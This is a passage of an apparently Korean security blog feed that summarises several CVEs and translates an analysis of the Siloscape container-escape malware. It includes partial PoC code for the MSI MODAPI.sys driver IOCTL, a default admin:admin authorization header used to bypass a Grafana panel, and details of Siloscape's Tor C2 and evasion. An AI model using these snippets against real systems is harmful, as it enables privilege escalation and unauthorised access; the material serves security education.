<code>blink::AudioNodeOutput::Pull</code>은 이 AudioNode 객체를 실행합니다.</p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>cve</tag>
      
      <tag>use after free</tag>
      
      <tag>idioth</tag>
      
      <tag>google</tag>
      
      <tag>webaduio</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] CVE-2021-20226: 리눅스 커널의 UAF 취약점</title>
    <link href="/2021/06/23/fabu1ous/2021-06-23/"/>
    <url>/2021/06/23/fabu1ous/2021-06-23/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://flattsecurity.medium.com/cve-2021-20226-a-reference-counting-bug-which-leads-to-local-privilege-escalation-in-io-uring-e946bd69177a">CVE-2021–20226 a reference counting bug which leads to local privilege escalation in io_uring.</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a><strong>Target</strong></h2><p>io_uring in Linux kernel 5.6</p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a><strong>Explain</strong></h2><p>Linux kernel 비동기 I/O 메커니즘인 io_uring에서 발생하는 Use-after-free 취약점에 대한 새로운 write-up이 공개되었습니다. File structure를 worker 스레드가 사용할 메모리로 옮기는 과정에서 reference 카운터를 늘리지 않고 file descriptor table을 공유하면 취약점이 발생합니다. </p><p>Worker 스레드는 file_struct 구조체에 대한 reference를 찾기 위해 함수 <code>fdget()</code>를 사용합니다. 하지만 <code>fdget()</code>는 file_struct에 대한 reference counter가 1일 때 이를 증가시키지 않으므로 <code>fdget()</code>에 의해 얻은 파일은 이미 닫히고 해제되어 있을 수도 있습니다.</p><p>이미 닫히고 해제된 파일에 접근해 작업한다는 것은 Use-after-free 취약점으로 해커는 이를 악용해 로컬 시스템에 서비스 거부 공격을 할 수 있습니다.</p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Fabu1ous</tag>
      
      <tag>linux</tag>
      
      <tag>kernel</tag>
      
      <tag>uaf</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] CVE-2021-29337: MSI Dragon Center의 로컬 권한 상승 취약점</title>
    <link href="/2021/06/22/l0ch/2021-06-22/"/>
    <url>/2021/06/22/l0ch/2021-06-22/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://github.com/rjt-gupta/CVE-2021-29337">CVE-2021-29337 - Privilege Escalation in MODAPI.sys (MSI Dragon Center)</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>MSI Dragon Center 2.0.104.0</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>LED 시스템, 시스템 환경 설정, 모바일 앱 원격 제어 등의 기능을 지원하는 MSI의 시스템 모니터링 유틸리티인 Dragon Center에서 발견된 로컬 권한 상승 취약점의 PoC가 공개되었습니다.</p><p>취약점은 Dragon Center의 커널 드라이버 <code>MODAPI.sys</code>에 존재하며 PoC의 일부 코드는 다음과 같습니다.</p><pre><code class="hljs c"><span class="hljs-comment">//Allocate Input Buffer</span>LPVOID lpInMemoryArea = VirtualAlloc((LPVOID)<span class="hljs-number">0x41000000</span>, <span class="hljs-number">0x100</span>, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);LPVOID lpOutMemoryArea = VirtualAlloc((LPVOID)<span class="hljs-number">0x42000000</span>, <span class="hljs-number">0x100</span>, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);<span class="hljs-comment">//Set Input Buffer</span>DWORD pPhysicalMemAddr = <span class="hljs-number">0xE0000</span>;DWORD dwDataSizeToRead = <span class="hljs-number">0x4</span>;DWORD dwAmountOfDataToRead = <span class="hljs-number">8</span>;memmove(lpInMemoryArea, &amp;pPhysicalMemAddr, <span class="hljs-keyword">sizeof</span>(DWORD));memmove((BYTE*)lpInMemoryArea + <span class="hljs-number">0x8</span>, &amp;dwDataSizeToRead, <span class="hljs-keyword">sizeof</span>(DWORD));memmove((BYTE*)lpInMemoryArea + <span class="hljs-number">0xC</span>, &amp;dwAmountOfDataToRead, <span class="hljs-keyword">sizeof</span>(DWORD));<span class="hljs-comment">// Send IOCTL</span>DWORD dwLastError = DeviceIoControl(hDriver, <span class="hljs-number">0x9C406104</span>, lpInMemoryArea, <span class="hljs-number">0x10</span>, lpOutMemoryArea, <span class="hljs-number">0x40</span>, &amp;dwBytesOut, <span class="hljs-literal">NULL</span>);</code></pre><p><code>MODAPI.sys</code>의 METHOD_BUFFERED IOCTL <code>0x9C406104</code> 는 물리 메모리를 가상 주소 공간에 매핑하는 <code>MmMapIoSpace</code> 루틴을 호출합니다. 이를 악용해 해커가 Input Buffer인 <code>lpInMemoryArea</code> 에 권한 상승을 위한 임의의 값을 설정한 뒤 <code>DeviceIoControl</code>을 통해 IOCTL 요청을 보내면 Windows의 커널 메모리를 유저모드의 데이터로 임의로 조작 할 수 있으며 이는 로컬 권한 상승으로 이어질 수 있습니다.</p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>cve</tag>
      
      <tag>windows</tag>
      
      <tag>lpe</tag>
      
      <tag>msi</tag>
      
      <tag>L0ch</tag>
      
      <tag>local privilege escalation</tag>
      
      <tag>kernel driver</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] VirusTotal Grafana Admin Panel bypass</title>
    <link href="/2021/06/21/idioth/2021-06-21/"/>
    <url>/2021/06/21/idioth/2021-06-21/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://infosecwriteups.com/grafana-admin-panel-bypass-in-google-acquisition-virustotal-c5ecc9d7b8ae">Grafana Admin Panel bypass in Google Acquisition(VirusTotal)</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>grafana.internal.virustotal.com</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>구글이 인수한 VirusTotal의 서브 도메인 grafana.internal.virustotal.com에서 Admin Panel을 우회할 수 있는 취약점이 발견되었습니다. Grafana는 다중 플랫폼 오픈 소스 분석 및 모니터링 솔루션으로, 해당 도메인은 권한이 없으면 grafana 엔드포인트에 접속하거나 새로운 계정 생성이 불가능합니다. (Google, Github 등 다른 계정 이용 포함)</p><p>Grafana에는 사용자를 수정, 추가하고 비밀번호를 수정할 수 있는 엔드포인트가 존재하지만 일부 기능은 관리자만이 사용할 수 있습니다. Grafana에서 대부분의 민감한 request의 기본 인증 헤더는 <code>Authorization: Basic YWRtaW46YWRtaW4=</code>인데 base64로 decode하면 <code>admin:admin</code>이 나옵니다. 이를 사용해 관리자로 로그인한 후 관리자 권한을 가진 새 계정을 생성하여 애플리케이션 전체에 액세스할 수 있습니다.</p><p>또한 Admin Panel에서 VirusTotal 내부 텔레그램 그룹에 알림을 보내는 텔레그램 API 키가 존재합니다. 이를 통해 봇을 사용하여 텔레그램 그룹의 모든 사람에게 메시지를 전송할 수 있습니다.</p><pre><code class="hljs awk">https:<span class="hljs-regexp">//</span>api.telegram.org<span class="hljs-regexp">/bot_API_KEY/</span>sendMessage?chat_id=userid&amp;text= SOME_URL_ENCODED_TEXT</code></pre>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>idioth</tag>
      
      <tag>google</tag>
      
      <tag>grafana</tag>
      
      <tag>virustotal</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[Translation] Siloscape: First Known Malware Targeting Windows Containers to Compromise Cloud Environments</title>
    <link href="/2021/06/20/idioth/siloscape/"/>
    <url>/2021/06/20/idioth/siloscape/</url>
    
    <content type="html"><![CDATA[<p>안녕하세요. idioth입니다. 원래 오늘은 ghidra의 다음 파트가 나오는 날이죠. 하지만 여러 가지 사정으로 인해 번역글을 작성하게 되었어요.</p><p>아직 저는 기말 시험이 끝나지 않았고 또 사무실에 있는 노트북에 분석한 VM이 잠들어 있는데 어제 발에 레이저 치료를 받은 탓에 잘 걷지 못하고 있답니다 하하하. 생각보다 발 뒤꿈치로 걷는 거 할만해요 ^^….</p><p>아무튼 이런저런 이유로 기말 준비 중인 저에게 싸장님께서 읽으라고 추천해주신 글을 읽을 겸 번역해왔습니다! 후반부에 뺀 부분이 조금 있습니다! Siloscape의 행위를 보고 싶어서 IRC 접속 부분은 제외하고 번역을 했습니다. :)</p><blockquote><p>원문 글 : <a href="https://unit42.paloaltonetworks.com/siloscape/">Siloscape: First Known Malware Targeting Windows Containers to Compromise Cloud Environments</a></p></blockquote><h1 id="Executive-Summary"><a href="#Executive-Summary" class="headerlink" title="Executive Summary"></a>Executive Summary</h1><p>2021년 3월에 Windows container를 타깃으로 하는 최초의 악성코드를 발견했다. 지난 몇 년간 클라우드를 타깃으로 한 악성코드가 증가한 것을 생각하면 놀랍지는 않다. 이 악성코드는 container escape가 주목적이고 주로 server silo를 통해 Windows에서 구현되므로 Siloscape (silo escape처럼 들림 ㅎ)라고 이름 지었다.</p><p>Siloscape는 Windows container를 통해 Kubernetes clusters를 타깃으로 하는 악성코드이다. 주목적은 악성 컨테이너를 실행하기 위해 취약한 Kubernetes clusters에 백도어를 설치하는 것이다.</p><p>각 컨테이너는 하나의 클라우드 애플리케이션을 실행하는 반면에 하나의 클러스터는 여러 개의 클라우드 애플리케이션을 실행할 수 있으므로 개별 컨테이너를 손상시키는 것보다 전체 클러스터를 손상시키는 것이 더 치명적이다. 예시로 해커가 사용자 이름 및 암호, 조직의 기밀 정보와 내부 파일 또는 클러스텡 호스팅 된 전체 데이터베이스와 같은 중요 정보를 훔칠 수 있다. 해커가 랜섬웨어를 통해 조직의 파일을 인질로 잡을 수도 있다. 더 심각한 것은 많은 조직들이 클라우드로 이전하면서 개발, 테스트 환경으로 Kubernetes clusters를 많이 사용하고 있다. 이러한 점에서 광범위한 소프트웨어 공급망 공격이 발생할 수도 있다.</p><p>Siloscape는 C2 (Command and Cotrol) 서버에 익명으로 연결하기 위해 토르 프록시와 <code>.onion</code> 도메인을 사용한다. 23개(명?, 기관인지 사람인지 애매하네요)의 피해자를 찾았고 총 313명의 사용자를 호스팅 하는데 서버가 사용되고 있음을 발견했다. 이는 Siloscape가 캠페인의 빙산의 일각이라는 부분을 알려준다. 필자는 또한 이 캠페인이 1년 이상 지속되어 왔음을 발견했다.</p><p>이 리포트는 Windows container 취약점의 배경 지식, Siloscape의 기술 개요, Windows container 보안 권장 사항을 제공한다.</p><h1 id="Windows-Server-Container-취약점-개요"><a href="#Windows-Server-Container-취약점-개요" class="headerlink" title="Windows Server Container 취약점 개요"></a>Windows Server Container 취약점 개요</h1><p>2020년 7월 15에 <a href="https://unit42.paloaltonetworks.com/windows-server-containers-vulnerabilities/">Windows container boundaries에 관한 게시글</a>과 어떻게 우회할 수 있는지 작성했다. 이 게시글에서 컨테이너를 escape 하는 기술을 제공하고 해커가 escape 할 수 있는 위험이 있는 애플리케이션에 대해 이야기했다. 가장 중요한 애플리케이션은 Kubernetes의 Windows container node를 탈출하여 클러스터를 확산시키는 것이었다.</p><p>마이크로소프트에서 Windows Server container는 보안 기능이 아니라는 이유로 이 이슈를 취약점으로 생각하지 않았다. 따라서 컨테이너 내부에서 실행되는 각각의 애플리케이션은 호스트에서 직접 실행되는 것처럼 처리되어야 한다.</p><p>몇 주 후, Kubernetes가 이러한 이슈에 취약하다고 구글에 전달했다. 구글은 마이크로소프트에 전달하였고 마이크로소프트는 이 이슈를 Windows container에서 호스트로 escape 하는 것으로 결정하였지만 컨테이너에서 관리자 권한 없이 실행되면 취약점으로 간주된다.</p><p>그 후에 Windows Server container를 타깃으로 한 악성코드 Siloscape를 발견하였다. Siloscape는 Hyper-V가 아닌 Server Container를 사용하는 Kubernetes을 타깃으로 하는 난독화된 악성코드이며 주목적은 설정이 미흡한 Kubernetes 클러스터에 백도어를 열어 암호 화폐 채굴과 같은 악성 container를 실행하는 것이다.</p><p>악성코드의 동작과 기술에 대한 특징은 다음과 같다:</p><ul><li>알려진 취약점 (1-day)를 사용하여 타깃 클라우드 애플리케이션에 접근</li><li>Windows container escape를 통해 컨테이너를 escape 하고 underlying node에서 코드를 실행</li><li>node의 자격 증명을 통해 클러스터에 전파를 시도</li><li>토르 네트워크를 통해 IRC 프로토콜을 사용하여 C2 서버에 접속</li><li>추가 command 대기</li><li></li></ul><p>이 악성코드는 Kubernetes cluster의 컴퓨팅 리소스를 사용하여 암호화폐 채굴을 수행하고 손상된 클러스터에서 실행되는 수백 개의 애플리케이션의 중요 데이터를 가져올 수 있다.</p><p>C2 서버를 조사한 결과 이 악성코드는 큰 네트워크의 일부분이며 이 캠페인은 1년 이상 진행됐다. 게다가 캠페인의 특정 부분이 아직 활성화되어있다.</p><h1 id="기술-개요"><a href="#기술-개요" class="headerlink" title="기술 개요"></a>기술 개요</h1><p>Siloscape의 자세한 기술을 살펴보기 전에 전반적인 행위를 살펴보자.</p><p><img src="/2021/06/20/idioth/siloscape/Untitled.png"></p><ol><li>해커는 1-day 취약점이나 웹페이지, 데이터베이스 취약점을 사용하여 Windows container 내부에 원격 코드 실행 (Remote Code Execution, RCE)을 수행</li><li>Siloscape (<code>CloudMalware.exe</code>)를 C2 접속 정보와 함께 command line으로 실행</li><li>Siloscape는 <code>SeTcbPrivilege</code> 권한을 얻기 위해 <code>CExecSvc.exe</code>를 impersonate (<a href="https://unit42.paloaltonetworks.com/windows-server-containers-vulnerabilities/">해당 게시글</a>에서 기술 상세 내용 확인 가능)</li><li>호스트에 global symbolic link를 생성하고 컨테이너화 된 X 드라이브를 호스트의 C 드라이브에 연결</li><li>global link를 사용하여 호스트에서 이름으로 <code>kubectl.exe</code>를 찾고 정규식으로 Kubernetes 설정 파일을 찾음</li><li>손상된 노드가 새로운 Kubernetes deployments를 생성할 수 있는 권한이 충분한지 확인</li><li>unzip을 사용해 압축 파일에서 토르 클라이언트를 디스크로 추출 (Siloscape의 main binary에 파일이 압축되어 있음)</li><li>토르 네트워크에 연결</li><li>command line argument를 통해 C2 서버의 비밀번호를 암호화</li><li><code>.onion</code> 도메인을 사용하여 C2 서버에 연결</li><li>C2 서버에서 오는 명령을 기다리고, 명령이 올 경우 실행</li></ol><p>컨테이너를 타깃으로 한 다른 암호화폐 채굴이 주 목적인 악성코드들과 다르게 Siloscape는 클러스터를 손상시키지 않는다. 대신에 탐지 및 추적을 방지하고 클러스터에 백도어를 설치하는 데에 집중했다.</p><h1 id="Defense-우회와-난독화"><a href="#Defense-우회와-난독화" class="headerlink" title="Defense 우회와 난독화"></a>Defense 우회와 난독화</h1><p>Siloscape는 심하게 난독화되어 있으며 대부분의 문자열을 읽을 수 없다. 난독화 로직은 어렵지 않지만 리버싱 하기 너무 힘들다.</p><p><img src="/2021/06/20/idioth/siloscape/Untitled%201.png"></p><p>단순한 API 호출도 난독화 되어있으며 함수를 단순하게 호출하지 않고 Native API (NTAPI)를 사용하였다.</p><p><img src="/2021/06/20/idioth/siloscape/Untitled%202.png"></p><p>예시로 <code>CreateFile</code>을 호출하는 대신에 <code>NtCreateFile</code>을 호출한다. <code>NtCreateFile</code>을 직접 호출하는 대신에 런타임에서 <code>ntdll.dll</code>에서 함수 이름을 찾아 주소로 점프하여 호출한다. 그뿐만 아니라 함수와 모듈 이름을 난독화하고 런타임에서 복호화한다. 정적 분석으로는 분석하기 어렵고 리버스 엔지니어링 하는데 힘든 악성코드이다.</p><p>Siloscape는 한 쌍의 key를 사용하여 C2 서버의 비밀번호를 복호화한다. 난독화 중에서 가장 중요한 특징은 키 하나는 바이너리에 하드 코딩되어 있는데, 하나는 command line argument에서 제공된다는 점이다. AutoFocus와 VirusTotal 같은 여러 엔진에서 hash를 검색해도 결과를 찾을 수 없었다. 이를 통해 Siloscape는 새로운 공격을 할 때 고유한 키를 사용해서 컴파일을 하는 것을 유추할 수 있다. 하드 코딩된 키는 바이너리들을 살짝씩 다르게 만들어서 hash를 통해 찾을 수 없음을 설명한다. 또 hash만으로 Siloscape를 탐지할 수 없다.</p><p><img src="/2021/06/20/idioth/siloscape/Untitled%203.png"></p><p>다른 흥미로운 특징은 Visual Studio의 Resource Manager를 사용한 것이다. Visual Studio에 내장된 기능으로 어떤 파일이든 원본 바이너리에 추가할 수 있고 간단한 API 호출을 통해 포인터를 얻을 수 있다. Siloscape는 디스크에 토르 아카이브와 아카이브를 열기 위해 사용되는 unzip 바이너리를 이를 통해 추가했다. 또한 토르를 통해 C2 서버에 안전하게 접속한다.</p><h1 id="The-Container-Escape"><a href="#The-Container-Escape" class="headerlink" title="The Container Escape"></a>The Container Escape</h1><p>Siloscape의 흥미로운 점 중 하나는 컨테이너를 escape 하는 것이다. escape를 하기 위해 system call <code>NtSetInformationSymbolicLink</code>를 실행하려면 <code>SeTcbPrivilege</code> 권한을 얻어야 한다. 여기에는 몇 가지 방법이 있다. 예를 들어 권한을 가진 <code>CExecSvc.exe</code>에 DLL을 inject 하고 그 context에서 <code>NtSetInformationSymbolicLink</code>를 실행할 수 있다. 하지만 Siloscape는 기술 문서나 예시가 거의 없는 Thread Impersonation을 사용하였다. 이 기술의 주요한 함수는 문서화되지 않은 system call <code>NtImpersonateThread</code>이다.</p><p>Siloscape는 main thread를 impersonating 하여 <code>CExecSvc.exe</code>의 권한을 모방하고 컨테이너를 깨기 위해 새로 생성된 symbolic link에서 <code>NtSetInformationSymbolicLink</code>를 호출한다. 구체적으로 컨테이너화 된 X 드라이브를 호스트의 C 드라이브에 연결한다.</p><h1 id="클러스터-선택"><a href="#클러스터-선택" class="headerlink" title="클러스터 선택"></a>클러스터 선택</h1><p>호스트에 link를 생성한 뒤에 Kubernetes 노드에 존재하는 <code>kubectl.exe</code>와 Kubernetes 설정 파일을 찾는다.</p><p><img src="/2021/06/20/idioth/siloscape/Untitled%204.png"></p><p>이름을 통해 <code>kubectl.exe</code>를 찾고 정규식을 사용해 Kubernetes 설정 파일을 찾는다. 검색하는 함수는 검색을 안 할 폴더 이름이 포함된 벡터의 포인터를 추가적인 인수로 사용한다.</p><p><img src="/2021/06/20/idioth/siloscape/Untitled%205.png"></p><p>파일 검색을 위해 <code>FindFile</code>을 호출할 때 검색 속도를 빠르게 하기 위해 <code>Program Files</code>, <code>Program Files (x86)</code>, <code>Windows</code>, <code>Users</code> 폴더를 제외한다. (해당 폴더에 파일이 존재하지 않을 가능성이 높으므로) 두 파일을 모두 찾으면 전역 변수에 경로가 저장된다. 파일이 없으면 공격을 멈추고 siloscape가 종료된다.</p><p><code>kubectl</code>을 실행하는데 필요한 걸 모두 찾은 다음 <code>%ls auth can-i create deployments --kubeconfig=%ls</code> 명령어를 통해 손상된 노드가 악성 행위를 할 수 있는 권한이 있는지 확인한다. </p><h1 id="C2-연결-및-지원-명령어"><a href="#C2-연결-및-지원-명령어" class="headerlink" title="C2 연결 및 지원 명령어"></a>C2 연결 및 지원 명령어</h1><p>손상된 노드가 새로운 deployments를 생성할 수 있으면 호스트의 C 드라이브에 토르 아카이브와 unzip 바이너리를 추출한다. 토르를 추출한 후 <code>tor.exe</code>를 새 스레드로 시작하고 토르 스레드의 output을 확인할 때까지 대기한다.</p><p>토르가 실행되면 <code>.onion</code> 도메인을 통해 IRC 서버인 C2에 연결한다.</p><p>서버는 비밀번호로 보호되고 있고 command line argument와 바이트 XOR을 통해 복호화한다. C2 서버의 복호화 로직을 간단하게 표현하면 다음과 같다.</p><pre><code class="hljs angelscript">char hardCodedXor[<span class="hljs-number">32</span>] = <span class="hljs-string">&quot;HARD_CODED_32_LONG_STRING&quot;</span>;char ircPass[<span class="hljs-number">32</span>] = &#123; <span class="hljs-number">0</span> &#125;;<span class="hljs-keyword">for</span> (<span class="hljs-built_in">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">32</span>; i++)     ircPass[i] = hardCodedXor[i] ^ argv[<span class="hljs-number">1</span>][i];</code></pre><p>IRC 서버에 연결이 성공하면 <code>JOIN #WindowsKubernetes</code> 명령어를 사용하여 <code>WindowsKubernetes</code> IRC 채널에 들어간 후 대기한다.</p><p>Siloscape는 kubectl 지원 명령과 Windows <code>cmd</code> 명령 두 가지 유형의 명령이 있다.</p><p><img src="/2021/06/20/idioth/siloscape/Untitled%206.png"></p><p>명령을 <code>admin</code> 사용자가 받으면 다음 로직을 따른다.</p><ul><li>메시지가 <code>K</code>로 시작하면 <code>%ls %s --kubeconfig=%ls</code> 명령을 실행하여 위에서 찾은 경로로 클러스터에 kubectl 명령 실행<ul><li>첫 번째 파라미터 : 전역 변수의 kubectl의 경로</li><li>두 번째 파라미터 : 첫번째 문자를 제외한 admin으로의 메시지</li><li>세 번째 파라미터 : 전역 변수의 설정 파일 경로</li></ul></li><li>메시지가 <code>C</code>로 시작하면 첫 번째 문자를 빼고 Windows cmd 명령을 실행</li></ul><h1 id="결론"><a href="#결론" class="headerlink" title="결론"></a>결론</h1><p>리소스 하이재킹이나 DoS를 목적으로 한 대부분의 클라우드 악성코드와 달리 Siloscape는 하나의 목적에만 국한되지 않고 다양한 악성 행위를 수행하기 위해 백도어를 설치한다.</p><p><a href="https://unit42.paloaltonetworks.com/windows-server-containers-vulnerabilities/">필자의 지난 게시글</a>에서 얘기했듯 마이크로소프트는 보안 기능으로 Windows container를 사용하지 말라고 했다. 마이크로소프트는 security boundary를 컨테이너화에 의존하지 말고 Hyper-V 컨테이너를 사용하는 걸 추천한다. Windows Server container에서 실행되는 모든 프로세스는 호스트의 관리자 권한을 가진 것으로 생각해야 하며 이번 경우에는 Kubernetes node였다. 보안이 필요한 Windows Server container에서 애플리케이션을 실행하는 경우 Hyper-V 컨테이너에서 실행하는 게 좋다.</p><p>게다가 관리자는 Kubernetes cluster를 안전하게 설정해야 한다. secured Kubernetes node의 권한은 해당 악성코드가 실행될 만큼의 충분한 권한이 없어서 Siloscape에 영향을 받지 않는다.</p><p>Siloscape는 container escape를 하지 못하면 피해를 유발하지 않는다는 점에서 컨테이너 보안의 중요성을 보여준다.</p>]]></content>
    
    
    <categories>
      
      <category>Translation</category>
      
    </categories>
    
    
    <tags>
      
      <tag>idioth</tag>
      
      <tag>cloud</tag>
      
      <tag>malware</tag>
      
      <tag>containers</tag>
      
      <tag>kubernetes</tag>
      
      <tag>siloscape</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] Bypassing Image Load Kernel Callbacks</title>
    <link href="/2021/06/20/j0ker/2021-06-20/"/>
    <url>/2021/06/20/j0ker/2021-06-20/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://www.mdsec.co.uk/2021/06/bypassing-image-load-kernel-callbacks/">Bypassing Image Load Kernel Callbacks</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>Windows</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>프로그램에서 LoadLibrary 함수를 통해 DLL 파일을 로드하면 커널에서 등록한 Callback 함수에 의해 이벤트 로그에 해당 DLL이 로드되었다는 내용가 기록됩니다. LoadLibrary 함수를 분석해보면, 해당 이벤트는 내부 구조체들이 링크되는 과정이나 코드가 실행될 때 발생하는 것이 아니라 메모리에 할당하고 이를 셋업하는 과정에서 NtMapViewOfSection 함수에 의해 발생하는 것을 알 수 있습니다. 실제 LoadLibrary 함수를 똑같이 구현하되 NtMapViewOfSection 함수까지의 과정만 구현하고 실행할 경우, DLL이 로드되었다는 이벤트만 발생할 뿐, 실제로 DLL이 로드되지는 않습니다.</p><p>Dylan은 커널의 Callback 함수 호출을 우회하여 이벤트 로그의 발생 없이 DLL을 로드하는 방법과 이를 구현한 <a href="https://github.com/bats3c/DarkLoadLibrary">DarkLoadLibrary 소스코드</a>를 공개했습니다. 동작 과정은 아래와 같습니다.</p><ol><li>정상적인 PE 포맷을 가지고 있는지 확인</li><li>헤더와 섹션 데이터를 메모리에 복사 후 메모리 권한 설정</li><li>(필요하다면) 이미지 베이스 조정</li><li>import table과 delayed import table 세팅</li><li>TLS callback 실행</li><li>exception handler 등록</li><li>DllMain(Entry Point) 호출</li></ol><p>Dylan은 이 기법을 통해 악성코드가 어떤 DLL을 로드했는지에 대한 로그를 숨길 수 있고 이 기법이 Reflective DLL Injection을 대체할 것으로 예상하고 있다고 밝혔습니다.</p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>windows</tag>
      
      <tag>j0ker</tag>
      
      <tag>bypass</tag>
      
      <tag>loadimage</tag>
      
      <tag>event</tag>
      
      <tag>darkloadlibrary</tag>
      
      <tag>callback</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] PuzzleMaker: 실제 공격에 사용된 Exploit chain</title>
    <link href="/2021/06/19/fabu1ous/2021-06-19/"/>
    <url>/2021/06/19/fabu1ous/2021-06-19/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://securelist.com/puzzlemaker-chrome-zero-day-exploit-chain/102771/">PuzzleMaker attacks with Chrome zero-day exploit chain</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a><strong>Target</strong></h2><p>Google Chrome &lt;= 90.0.4430.85</p><p>Windows</p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a><strong>Explain</strong></h2><p>최근 여러 기업에 대한 고도로 표적화된 공격이 감지되었습니다. Kaspersky technologies의 분석에 따르면 해당 공격들은 구글 Chrome(CVE-2021-21224)과 Windows(CVE-2021-31955, CVE-2021-31956) 제로데이 Exploit chain을 사용합니다.</p><ul><li><p>CVE-2021-21224</p><p>90.0.4430.85이전 Chrome의 V8에는 Type confusion 취약점이 존재해 해커로 하여금 악성 HTML 페이지를 통해 원격으로 임의 코드 실행을 할 수 있게 합니다.</p></li><li><p>CVE-2021-31955</p><p>ntoskrnl.exe에 존재하는 정보 노출 취약점입니다. Windows OS의 SuperFetch 기능을 악용한 것으로 <code>NtQuerySystemInformation</code>함수에 의해 반환된 SuperFetch 정보 클래스에 EPROCESS 커널 주소를 포함하기 때문에 발생합니다.</p></li><li><p>CVE-2021-3195</p><p>ntfs.sys에 존재하는 heap-based buffer overflow취약점입니다.<code> NTFSQUeryEaUserEaList</code>는 파일에 대한 확장 attribute 목록을 처리하고 버퍼에 저장합니다. 해당 기능은 output 버퍼의 크기를 제어할 수 있고 32비트 alignment로 정렬합니다. Output 버퍼의 패딩 기능에 integer underflow 검사가 없어서 Heap overflow가 발생합니다.</p></li></ul>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Fabu1ous</tag>
      
      <tag>cve</tag>
      
      <tag>eop</tag>
      
      <tag>windows</tag>
      
      <tag>rce</tag>
      
      <tag>chrome</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] ISC BIND 서버의 정보 유출 취약점</title>
    <link href="/2021/06/18/l0ch/2021-06-18/"/>
    <url>/2021/06/18/l0ch/2021-06-18/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://www.zerodayinitiative.com/blog/2021/6/15/zdi-21-502-an-information-disclosure-bug-in-isc-bind-server">ZDI-21-502: AN INFORMATION DISCLOSURE BUG IN ISC BIND SERVER</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>BIND 9.11.31, 9.16.15 이전 </li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>ISC사의 DNS 서버 소프트웨어인 BIND에서 발견된 정보 유출 취약점의 세부 정보가 공개되었습니다.</p><p><code>der_match_tag_and_length()</code> 함수는 태그를 매칭하고 네트워크 패킷에서 길이와 같은 필드를 파싱하는 함수로, 취약점이 발생하는 코드는 아래와 같습니다.</p><pre><code class="hljs jsx"><span class="hljs-keyword">static</span> int der_match_tag_and_length(<span class="hljs-keyword">const</span> unsigned char *p, size_t len, Der_class xclass,                 Der_type type, int tag, size_t *length_ret,  size_t *size) &#123;     size_t l, ret = <span class="hljs-number">0</span>;     int e;      e = der_match_tag(p, len, xclass, type, tag, &amp;l);     <span class="hljs-keyword">if</span> (e) &#123;         <span class="hljs-keyword">return</span> (e);     &#125;     p += l;     len -= l;     ret += l;     e = der_get_length(p, len, length_ret, &amp;l);  <span class="hljs-comment">// (1) </span>    <span class="hljs-keyword">if</span> (e) &#123;         <span class="hljs-keyword">return</span> (e);     &#125; ...&#125;</code></pre><p>해당 함수에서 호출하는 <code>der_get_length()</code> 함수의 인자 중 <code>length_ret</code>은 호출자에서 값에 대한 검증이 이뤄져야 하지만 해당 함수에서는 검증을 하지 않고 반환합니다. <code>der_match_tag_and_length()</code> 함수에서 반환된 검증되지 않은 길이 값은 이후 <a href="https://datatracker.ietf.org/doc/html/rfc4178#section-4.2.1">negTokenInit</a>을 디코딩하는 <code>decode_NegTokenInit()</code> 함수 내의 여러 검사에 사용되어 OOB Access로 이어질 수 있습니다.</p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>information disclosure</tag>
      
      <tag>out-of-bounds</tag>
      
      <tag>L0ch</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] dialogflow.cloud.google.com 권한 상승 취약점</title>
